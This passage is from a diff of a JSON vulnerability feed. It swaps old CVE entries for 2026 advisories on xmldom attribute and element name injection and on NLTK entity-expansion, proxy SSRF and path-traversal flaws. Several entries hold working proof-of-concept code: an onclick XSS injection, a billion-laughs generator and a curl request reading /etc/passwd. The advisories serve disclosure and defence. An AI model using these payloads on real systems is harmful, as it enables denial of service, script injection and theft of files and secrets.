null);\ndoc.documentElement.appendChild(doc.createElement('img src=x onerror=\"alert(1)\"'));\n\n// Default (unchanged): verbatim — injection present\nconsole.log(new XMLSerializer().serializeToString(doc));\n// <root><img src=x onerror=\"alert(1)\"/></root>\n\n// Opt-in guard: throws InvalidStateError before serializing\ntry {\n  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });\n} catch (e) {\n  console.log(e.name, e.message);\n  // InvalidStateError: The element name \"img src=x onerror=\"alert(1)\"\" is not a valid XML QName\n}\n```\n\n### Why the default stays verbatim\n\nThe W3C DOM Parsing and Serialization spec defines a `require well-formed` flag whose **default value is `false`**. With the flag unset, the serializer emits element names verbatim, matching the `XMLSerializer` behavior of Chrome, Firefox, and Safari. Unconditionally throwing would be a behavioral breaking change with no spec justification; the opt-in `requireWellFormed: true` flag lets applications that require injection safety enable strict mode without breaking existing code.\n\n### Residual limitation\n\n`createElement(tagName)` does not validate `tagName` at creation time. Enforcing an `InvalidCharacterError` for invalid names unconditionally at creation time is a breaking change and is deferred to the next breaking release. When the default serialization path is used (without `requireWellFormed: true`), invalid element names are still emitted verbatim; applications that do not pass `requireWellFormed: true` remain exposed.\n\nCreation-time validation is tracked in a public issue on the next breaking-release milestone (filed at publication — issue link to be added), targeting the next breaking release.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1997-03-01",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-91",
+        "name": "XML Injection (aka Blind XPath Injection)"
+      },
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0318",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0318"
+        "https://github.com/xmldom/xmldom/security/advisories/GHSA-w2rr-34g9-rvrj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-83607",
+        "https://github.com/xmldom/xmldom/pull/1043",
+        "https://github.com/xmldom/xmldom/pull/1050",
+        "https://github.com/xmldom/xmldom/commit/cba1321218b069182695813fa7565653708e172e"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@xmldom/xmldom npm",
+        "xmldom npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1489",
-      "summary": "Buffer overflow in TestChip function in XFree86 SuperProbe in Slackware Linux 3.1 allows local users to gain root privileges via a long -nopr argument.",
-      "cvssScore": 7.2,
+      "id": "CVE-2026-83605",
+      "summary": "## Summary\n\n`Element.setAttribute()` in `@xmldom/xmldom` bypasses attribute name validation by calling the private `_createAttribute(name)` method, which performs no validation. The public `createAttribute()` method correctly validates names against an anchored `QName` pattern, but `setAttribute()` never uses it. The serializer escapes attribute *values* but trusts attribute *names*, allowing an attacker to inject additional attributes (including event handlers) into serialized output. The `requireWellFormed: true` option did not catch this.\n\n## Details\n\n`Element.setAttribute(name, value)` creates attribute nodes by calling the private `_createAttribute(name)` method, which performs no validation on the `name` parameter. In contrast, the public `Document.createAttribute(name)` method validates the name against the `QName` production before creating the attribute node.\n\nThe result is a two-tier validation system where the most commonly used API (`setAttribute`) takes the unvalidated path:\n\n- `doc.createAttribute(\"bad name\")` — throws `INVALID_CHARACTER_ERR` (correct).\n- `el.setAttribute(\"bad name\", \"value\")` — succeeds silently (vulnerable).\n\nThe serializer emits attribute names verbatim into the output. Because attribute values ARE escaped (quotes, ampersands, etc.), the injection must occur through the name. An attacker can terminate the current attribute and inject new ones by including quote and space characters in the attribute name.\n\n### Root Cause\n\n1. `setAttribute()` calls `_createAttribute()` (private, no validation) instead of `createAttribute()` (public, validates against `QName`).\n2. The serializer trusts attribute names and emits them unescaped.\n3. The serializer's `requireWellFormed` code path did not validate attribute names during serialization.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// The attribute name contains a closing quote, a space, and a new attribute\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// <root class=\"safe\" onclick=\"alert(1)\"/>\n//\n// The single setAttribute() call produced TWO attributes:\n//   1. class=\"safe\"\n//   2. onclick=\"alert(1)\"\n//\n// requireWellFormed: true did NOT prevent the injection.\n```\n\n### Demonstrating the validation gap\n\n```js\n// Public createAttribute correctly rejects invalid names:\ntry {\n  doc.createAttribute('class=\"safe\" onclick');\n} catch (e) {\n  console.log('createAttribute rejects:', e.message);\n}\n\n// But setAttribute (which uses _createAttribute) accepts the same input:\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n// No error thrown\n```\n\n## Impact\n\nApplications that use `setAttribute()` with any user-controlled portion of the attribute name are vulnerable to attribute injection attacks. This includes:\n\n- **Cross-Site Scripting (XSS)**: Injecting event handler attributes into HTML output consumed by browsers.\n- **Security attribute override**: Overriding security-relevant attributes such as `integrity`, `nonce`, `sandbox`, or `Content-Security-Policy` meta attributes.\n- **Validation bypass**: The public `createAttribute()` API validates while `setAttribute()` does not, creating an inconsistent security boundary that developers cannot rely on.\n- **requireWellFormed bypass**: Applications that adopted `requireWellFormed: true` as a mitigation for prior CVEs remained vulnerable.\n\n`@xmldom/xmldom` can also be used inside browsers, where it mirrors the DOM API. Unlike the browser's `setAttribute()`, which rejects an invalid attribute name with `InvalidCharacterError`, xmldom accepts it — developers may assume the same safety and skip validation.\n\n## Fix Applied\n\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\nWhen `{ requireWellFormed: true }` is passed, the serializer now validates each serialized attribute's qualified name against the XML `QName` production and throws `InvalidStateError` before emitting it. This covers ordinary attribute names **and** synthesized `xmlns:PREFIX` namespace declarations (the namespace-prefix sub-vector).\n\nFixed under `requireWellFormed: true` in `@xmldom/xmldom` **0.9.11** and **0.8.14**. Default serialization is unchanged.\n\n### PoC — fixed path\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', null);\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n\n// Default (unchanged): verbatim — injection present\nconsole.log(new XMLSerializer().serializeToString(doc));\n// <root class=\"safe\" onclick=\"alert(1)\"/>\n\n// Opt-in guard: throws InvalidStateError before serializing\ntry {\n  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });\n} catch (e) {\n  console.log(e.name, e.message);\n  // InvalidStateError: The attribute name \"class=\"safe\" onclick\" is not a valid XML QName\n}\n```\n\n### Why the default stays verbatim\n\nThe W3C DOM Parsing and Serialization spec defines a `require well-formed` flag whose **default value is `false`**. With the flag unset, the serializer emits attribute names verbatim, matching the `XMLSerializer` behavior of Chrome, Firefox, and Safari. Unconditionally throwing would be a behavioral breaking change with no spec justification; the opt-in `requireWellFormed: true` flag lets applications that require injection safety enable strict mode without breaking existing code.\n\n### Residual limitation\n\n`setAttribute(name, value)` does not validate `name` at creation time (unlike the public `createAttribute()`, which already does). Making `setAttribute()` reject invalid names unconditionally is a breaking change and is deferred to the next breaking release. When the default serialization path is used (without `requireWellFormed: true`), attribute names set via `setAttribute()` are still emitted verbatim; applications that do not pass `requireWellFormed: true` remain exposed.\n\nCreation-time validation is tracked in a public issue on the next breaking-release milestone (filed at publication — issue link to be added), targeting the next breaking release.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1997-03-04",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-91",
+        "name": "XML Injection (aka Blind XPath Injection)"
+      },
       "references": [
-        "http://www.securityfocus.com/archive/1/6384",
-        "http://www.securityfocus.com/bid/364",
-        "http://www.securityfocus.com/archive/1/6384",
-        "http://www.securityfocus.com/bid/364"
+        "https://github.com/xmldom/xmldom/security/advisories/GHSA-4w3w-2rp5-g8jm",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-83605",
+        "https://github.com/xmldom/xmldom/pull/1043",
+        "https://github.com/xmldom/xmldom/pull/1050",
+        "https://github.com/xmldom/xmldom/commit/cba1321218b069182695813fa7565653708e172e"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@xmldom/xmldom npm",
+        "xmldom npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0658",
-      "summary": "Buffer overflow in AnalogX proxy server 4.04 and earlier allows remote attackers to cause a denial of service via a long USER command in the POP3 protocol.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0360.html",
-        "http://www.analogx.com/contents/download/network/proxy.htm",
-        "http://www.securityfocus.com/bid/1504",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0360.html",
-        "http://www.analogx.com/contents/download/network/proxy.htm"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0659",
-      "summary": "Buffer overflow in AnalogX proxy server 4.04 and earlier allows remote attackers to cause a denial of service via a long user ID in a SOCKS4 CONNECT request.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0360.html",
-        "http://www.securityfocus.com/bid/1504",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0360.html",
-        "http://www.securityfocus.com/bid/1504"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0663",
-      "summary": "The registry entry for the Windows Shell executable (Explorer.exe) in Windows NT and Windows 2000 uses a relative path name, which allows local users to execute arbitrary commands by inserting a Trojan Horse named Explorer.exe into the %Systemdrive% directory, aka the \"Relative Shell Path\" vulnerability.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-07-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.microsoft.com/technet/support/kb.asp?ID=269049",
-        "http://www.securityfocus.com/bid/1507",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-052",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5040",
-        "http://www.microsoft.com/technet/support/kb.asp?ID=269049"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0637",
-      "summary": "Microsoft Excel 97 and 2000 allows an attacker to execute arbitrary commands by specifying a malicious .dll using the Register.ID function, aka the \"Excel REGISTER.ID Function\" vulnerability.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-07-26",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1451",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=396B3F8F.9244D290%40nat.bg",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-051",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5016",
-        "http://www.securityfocus.com/bid/1451"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0664",
-      "summary": "AnalogX SimpleServer:WWW 1.06 and earlier allows remote attackers to read arbitrary files via a modified .. (dot dot) attack that uses the %2E URL encoding for the dots.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-26",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0374.html",
-        "http://www.analogx.com/contents/download/network/sswww.htm",
-        "http://www.osvdb.org/388",
-        "http://www.securityfocus.com/bid/1508",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4999"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0667",
-      "summary": "Vulnerability in gpm in Caldera Linux allows local users to delete arbitrary files or conduct a denial of service.",
-      "cvssScore": 3.6,
-      "severity": "Low",
-      "published": "2000-07-27",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0273.html",
-        "http://www.securityfocus.com/bid/1512",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0273.html",
-        "http://www.securityfocus.com/bid/1512"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0668",
-      "summary": "pam_console PAM module in Linux systems allows a user to access the system console and reboot the system when a display manager such as gdm or kdm has XDMCP enabled.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-27",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0398.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0455.html",
-        "http://www.redhat.com/support/errata/RHSA-2000-044.html",
-        "http://www.securityfocus.com/bid/1513",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5001"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0673",
-      "summary": "The NetBIOS Name Server (NBNS) protocol does not perform authentication, which allows remote attackers to cause a denial of service by sending a spoofed Name Conflict or Name Release datagram, aka the \"NetBIOS Name Server Protocol Spoofing\" vulnerability.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-27",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.nai.com/research/covert/advisories/044.asp",
-        "http://www.securityfocus.com/bid/1514",
-        "http://www.securityfocus.com/bid/1515",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-047",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5035"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0278",
-      "summary": "The SalesLogix Eviewer allows remote attackers to cause a denial of service by accessing the URL for the slxweb.dll administration program, which does not authenticate the user.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-08-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/current/0006.html",
-        "http://www.securityfocus.com/bid/1089",
-        "http://archives.neohapsis.com/archives/bugtraq/current/0006.html",
-        "http://www.securityfocus.com/bid/1089"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0545",
-      "summary": "Buffer overflow in mailx mail command (aka Mail) on Linux systems allows local users to gain privileges via a long -c (carbon copy) parameter.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-08-08",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0435.html",
-        "http://www.debian.org/security/2000/20000605",
-        "http://www.securityfocus.com/bid/1305",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0435.html",
-        "http://www.debian.org/security/2000/20000605"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1079",
-      "summary": "Interactions between the CIFS Browser Protocol and NetBIOS as implemented in Microsoft Windows 95, 98, NT, and 2000 allow remote attackers to modify dynamic NetBIOS name cache entries via a spoofed Browse Frame Request in a unicast or UDP broadcast datagram.",
-      "cvssScore": 7.5,
+      "id": "CVE-2026-78681",
+      "summary": "Several XML parsing sites in NLTK still used `xml.etree.ElementTree` directly, which honours `<!ENTITY>` declarations in a document's internal DTD subset. A crafted document a few hundred bytes long can expand to megabytes in memory (each nesting level multiplies by ten), a denial-of-service.\n\nAffected call sites (<= 3.10.2):\n- `nltk.chunk.named_entity.load_ace_file` — parses ACE annotation XML\n- `nltk.internals.ElementWrapper` — converts any given string to an Element\n- `nltk.downloader` — `Package.fromxml`, `Collection.fromxml`, `_find_collections`, `_find_packages`\n\nlibexpat 2.6.0 added an input-amplification cap, but it only engages above an activation threshold (~8 MiB output) and depends on whichever libexpat the interpreter links; builds against older libexpat have no cap at all. External entities are not resolved by ElementTree, so this is a memory-amplification DoS (CWE-776), not XXE/file disclosure.\n\nThis completes the earlier defusedxml adoption that these sites were missed by. Fix routes all of them through a new `nltk.xmlsec` module that refuses entity declarations, preferring `defusedxml` and falling back to a standard-library `xml.parsers.expat` pre-scan when defusedxml is absent.\n\n## Attack demonstration\n\nReproducible PoC against a real affected entry point (`nltk.internals.ElementWrapper`). Every number below is captured output, not illustrative.\n\n### 1. The amplification (vulnerable path: raw `xml.etree.ElementTree`)\n\nA payload of a few hundred bytes expands to megabytes in memory. Each nesting level multiplies output by 10 while adding ~56 bytes of input:\n\n| levels | input bytes | expanded bytes | factor |\n|--------|-------------|----------------|--------|\n| 3 | 218 | 10,000 | x45 |\n| 4 | 274 | 100,000 | x364 |\n| 5 | 330 | 1,000,000 | x3,030 |\n| 6 | 386 | (libexpat 2.7.1 cap trips) | - |\n\nThe level-6 cap is **libexpat's**, not NLTK's: it only engages above an ~8 MiB activation threshold, and older libexpat builds (still shipped with many 3.10/3.11 interpreters) have no cap at all. Under the threshold — up to ~1 MB per parse here — expansion always succeeds.\n\n```python\nimport xml.etree.ElementTree as ET\ndef bomb(levels):\n    d = \"\\n\".join(f'<!ENTITY e{i} \"{(\"&e%d;\"%(i-1))*10}\">' for i in range(1, levels+1))\n    return f'<!DOCTYPE d [<!ENTITY e0 \"AAAAAAAAAA\">{d}]><d>&e{levels};</d>'\nET.fromstring(bomb(5))   # -> element whose .text is 1,000,000 chars\n```\n\n### 2. The patched entry point rejects it\n\n```\n>>> from nltk.internals import ElementWrapper\n>>> ElementWrapper(bomb(5))\nEntitiesForbidden: EntitiesForbidden(name='e0', ...)\n```\n\n### 3. Why a text-based screen is not enough\n\nAn entity declaration can hide behind a decoy `<!DOCTYPE>` in a prolog comment. Raw ElementTree still processes the real declaration and expands; a guard that walks the DOCTYPE text is fooled. The shipped guard re-parses with expat, so it is not:\n\n```python\nevil = '<!-- <!DOCTYPE x [ ] > --><!DOCTYPE d [<!ENTITY a \"PPPP...\">]><d>&a;</d>'\n```\n\n```\nraw ElementTree -> EXPANDS ('PPPPPPPPPPPP...', 40 chars)\nnltk.xmlsec     -> REJECTED (EntitiesForbidden)\n```\n\nAn earlier draft of the fallback that walked the text **was** bypassed by this and 4 similar payloads (decoy DOCTYPE in a PI, stray `]` inside a PI in the internal subset). All five are now regression tests.\n\n### 4. Both back ends block it\n\n`nltk.xmlsec` prefers `defusedxml` and falls back to a stdlib `xml.parsers.expat` pre-scan. Same payloads, defusedxml hidden to force the fallback:\n\n```\nstdlib fallback | billion-laughs               -> REJECTED (EntitiesForbidden)\nstdlib fallback | comment-decoy differential   -> REJECTED (EntitiesForbidden)\n```\n\nEnvironment: python 3.13.7, libexpat 2.7.1. Confirmed identical amplification on python 3.10 (NLTK's floor).",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "2000-08-29",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-776",
+        "name": "Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')"
+      },
       "references": [
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0116.html",
-        "http://www.nai.com/research/covert/advisories/045.asp",
-        "http://www.securityfocus.com/bid/1620",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5168",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A1079"
+        "https://github.com/nltk/nltk/security/advisories/GHSA-97qj-x29f-37w7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-78681",
+        "https://github.com/nltk/nltk/commit/e91789c9a043296ad04912ce171c22776d45963b",
+        "https://github.com/nltk/nltk/releases/tag/v3.10.3",
+        "https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3748.yaml"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "nltk pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1511",
-      "summary": "Buffer overflows in Xtramail 1.11 allow attackers to cause a denial of service (crash) and possibly execute arbitrary commands via (1) a long PASS command in the POP3 service, (2) a long HELO command in the SMTP service, or (3) a long user name in the Control Service.",
-      "cvssScore": 7.5,
+      "id": "CVE-2026-78682",
+      "summary": "### Summary\n\nCurrent NLTK source reopens SSRF in proxied environments. `pathsec.urlopen()` validates the requested hostname locally, but once proxy inheritance is enabled the real fetch is performed by the proxy rather than by the validated direct-connect socket path.\n\n### Details\n\n- **Vulnerability type:** Server-side request forgery\n- **Affected component:** `nltk.pathsec.urlopen`, `nltk.data.load`, `nltk.downloader.Downloader.index`, `nltk.downloader.Downloader.download`\n- **Affected versions:** Current source `v3.10.0-rc2`; published `3.9.4` was a negative control and did not reproduce.\n- **Patched versions:** Not yet patched\n- **Root cause:** Proxy-handler inheritance disables `_SafeHTTPHandler` and `_SafeHTTPSHandler`, so the validated hostname no longer matches the actual egress destination.\n\nThe hardened direct path pins the validated numeric destination IP before opening the socket. The proxied branch instead copies `ProxyHandler` instances from the global opener, marks the request as proxied, and skips the pinned handlers. I confirmed that a validated public URL can be fetched from a loopback-only internal service through the proxy path via `pathsec.urlopen()`, `nltk.data.load()`, `Downloader.index()`, and `Downloader.download()`.\n\n### PoC\n\n**Preconditions**\n- The runtime has an HTTP proxy configured and the caller relies on `pathsec` to keep network fetches SSRF-safe.\n\n**Steps**\n1. Start a loopback-only HTTP server that serves secret text, a valid downloader index, and a ZIP payload.\n2. Configure a proxy that forwards a validated public URL to that internal loopback service.\n3. Call `pathsec.urlopen()` or `nltk.data.load()` on the public URL and observe the internal response is returned.\n4. Instantiate `Downloader(server_index_url=...)`, call `index()` and `download()`, and observe internal-only content is parsed and installed.\n\n**Minimal reproducible excerpt**\n\n```text\n{'urlopen': 'PROXY_TEXT_SECRET', 'data_load': 'PROXY_TEXT_SECRET', 'downloaded_file': 'INTERNAL_ZIP_SECRET'}\n```\n\n### Impact\n\nConsumers that trust `pathsec` as an SSRF barrier in proxied environments can be made to read internal-only HTTP resources, load forged downloader indexes, and install attacker-chosen package content fetched from the proxy's network view.\n\n### Remediation\n\nPreserve destination validation for the actual proxy egress target or fail closed when the request would otherwise downgrade into an unpinned proxied path. Add regression tests across `pathsec.urlopen`, `nltk.data.load`, and downloader fetches with a configured proxy.\n\n### References\n\n- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/pathsec.py#L468-L518\n- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/data.py#L1247-L1283\n- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/downloader.py#L875-L889\n- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/downloader.py#L1220-L1226\n- https://github.com/nltk/nltk/blob/3.9.4/nltk/pathsec.py#L245-L250\n\n## Fix + attack demonstration (verified)\n\nNLTK cannot pin the egress through a proxy, so it stops pretending to: under `ENFORCE` a proxied fetch is **refused** rather than performed unvalidated. Operators who trust their proxy opt back in with `NLTK_ALLOW_PROXIED_URLOPEN=1` or `nltk.pathsec.ALLOW_PROXIED_FETCH=True`; under `ENFORCE=False` the refusal degrades to a warning. This closes the **whole class** (environment proxies and explicit `ProxyHandler` alike), because NLTK declines any fetch whose egress it cannot validate.\n\n## Attack demonstration (reproduced; captured output)\nA loopback HTTP server stands in for the internal target; `http_proxy` points at it; NLTK is asked for a **public** IP URL.\n\n**Before the fix** — the internal secret is exfiltrated through the proxy:\n```\nvalidate_network_url(public): PASSED\n*** BYPASS: pathsec.urlopen returned INTERNAL content via proxy: 'INTERNAL_ONLY_SECRET'\n```\n\n**After the fix** — five scenarios, isolated subprocesses:\n| Scenario | Result |\n|---|---|\n| proxied (env) + ENFORCE | `PermissionError` — **blocked** |\n| proxied + opt-in | returns secret — escape hatch works |\n| explicit `ProxyHandler` (not env) + ENFORCE | `PermissionError` — **blocked** (whole class) |\n| no proxy (direct) | internal IP still refused — pinning intact |\n| proxied + `ENFORCE=False` | returns secret **+ warns** |\n\n## Tests\n`nltk/test/unit/test_pathsec.py`: 64 passed. Added an end-to-end regression (`test_proxied_fetch_does_not_reach_internal_target`) plus `test_env_proxy_fails_closed_under_enforce`; the prior `test_env_proxy_skips_pinning_handlers` (which encoded the vulnerable path) is re-expressed as the opt-in case. Existing direct-path DNS-rebinding and IP-policy tests unchanged and passing. pre-commit (isort/black/ruff) clean.\n\n## Note\nThe upfront `validate_network_url()` and the direct-path IP pinning (from the earlier DNS-rebinding fixes, CVE-2026-54296 / GHSA-qvv7) are unchanged — this only closes the proxied downgrade they didn't cover.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1999-11-10",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-441",
+        "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+      },
       "references": [
-        "http://marc.info/?l=bugtraq&m=94226003804744&w=2",
-        "http://www.securityfocus.com/bid/791",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3488",
-        "http://marc.info/?l=bugtraq&m=94226003804744&w=2",
-        "http://www.securityfocus.com/bid/791"
+        "https://github.com/nltk/nltk/security/advisories/GHSA-6ww7-3frv-cqxh",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-78682",
+        "https://github.com/nltk/nltk/commit/767333a005a1cd3d82d2029215f2dbe66a5844d9",
+        "https://github.com/nltk/nltk/releases/tag/v3.10.3",
+        "https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3733.yaml"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "nltk pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1539",
-      "summary": "Buffer overflow in FTP server in QPC Software's QVT/Term Plus versions 4.2d and 4.3 and QVT/Net 4.3 allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, via a long (1) user name or (2) password.",
-      "cvssScore": 7.5,
+      "id": "CVE-2026-63312",
+      "summary": "## Summary\nSetting `nltk.pathsec.ENFORCE = True` is documented to sandbox all file access to allowed NLTK data directories and raise `PermissionError` on unauthorized access. However, `StreamBackedCorpusView` opens files via `builtins.open()` directly, bypassing `pathsec.validate_path()` entirely. An attacker who can influence the `fileid` argument can read arbitrary local files regardless of the `ENFORCE` setting.\n\n## Details\n`nltk/pathsec.py:274` defines the enforcement point:\n```python\ndef open(file, mode=\"r\", **kwargs):\n    validate_path(file, context=\"pathsec.open\")\n    return builtins.open(file, mode=mode, **kwargs)\n```\n\n`StreamBackedCorpusView._open()` in `nltk/corpus/reader/util.py` bypasses this entirely for string paths:\n\n```python\n# line 171 — no validate_path() call\nself._eofpos = os.stat(self._fileid).st_size\n\n# line 208 — calls builtins.open directly\nself._stream = open(self._fileid, \"rb\")\n```\n\nAlso affected: `XMLCorpusView` and any corpus reader subclass that passes a raw string `fileid` to `StreamBackedCorpusView`.\n\n## PoC\n```python\n# poc_server.py — StreamBackedCorpusView pathsec.ENFORCE bypass\nfrom flask import Flask, request, jsonify\nimport nltk.pathsec as ps\nfrom nltk.corpus.reader.util import StreamBackedCorpusView, read_line_block\n\n# Strict mode enabled — expected to sandbox all file access\nps.ENFORCE = True\n\napp = Flask(__name__)\n\n@app.post(\"/read\")\ndef read_file():\n    fname = request.json.get(\"file\")\n    # fileid is user-controlled, passed directly to StreamBackedCorpusView\n    # pathsec.ENFORCE = True is ignored — builtins.open() called internally\n    view = StreamBackedCorpusView(fname, read_line_block, encoding=\"utf8\")\n    return jsonify({\"file\": fname, \"content\": view[0]})\n\napp.run(host=\"0.0.0.0\", port=8000)\n```\nTrigger:\n```\ncurl -s -X POST http://localhost:8000/read \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"file\": \"/etc/passwd\"}'\n```\nConfirmed on latest stable NLTK. No privileges required.\n\n## Impact\n- **Type:** Arbitrary Local File Read / Security Control Bypass\n- **CWE:** CWE-22, CWE-284\n- **OWASP:** A01:2021 – Broken Access Control\n\nAffects web apps, REST APIs, and multi-tenant NLP pipelines where user input influences the `fileid` passed to NLTK corpus readers. Sensitive targets include `/etc/passwd`, `/proc/self/environ` (may contain `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, etc.), and application config files.\n\nThe core issue is that operators who explicitly set `ENFORCE = True` to harden production deployments are left with a **false security guarantee**.\n\n**Suggested fix:** Replace `builtins.open()` and `os.stat()` in the string-path branch with `nltk.pathsec.open()` and `nltk.pathsec.validate_path()`.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1999-11-10",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
       "references": [
-        "http://marc.info/?l=bugtraq&m=94225924803704&w=2",
-        "http://marc.info/?l=ntbugtraq&m=94223972910670&w=2",
-        "http://www.securityfocus.com/bid/796",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3491",
-        "http://marc.info/?l=bugtraq&m=94225924803704&w=2"
+        "https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63312",
+        "https://github.com/nltk/nltk/pull/3588",
+        "https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b",
